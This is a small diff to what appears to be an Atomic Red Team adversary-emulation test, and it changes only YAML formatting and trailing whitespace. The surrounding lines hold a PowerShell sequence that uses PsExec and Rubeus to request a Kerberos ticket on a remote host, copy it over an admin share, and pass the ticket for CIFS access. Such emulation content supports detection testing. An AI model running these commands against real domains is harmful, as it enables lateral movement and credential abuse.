@@ -83,11 +83,11 @@ atomic_tests:
   executor:
     name: powershell
     elevation_required: true
-    command: |
+    command: |-
       & "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" -accepteula \\#{target} -w c:\ -c "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi
       Set-Location "PathToAtomicsFolder\..\ExternalPayloads"
       Move-Item -Force "\\#{target}\c$\ticket.kirbi" ticket.kirbi
       Write-Host "Successfully retrieved TGT from '#{target}', now requesting a TGS from local"
       & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt
       Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\ticket.kirbi"
-      & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge      
+      & "PathToAtomicsFolder\..\ExternalPayloads\rubeus.exe" purge
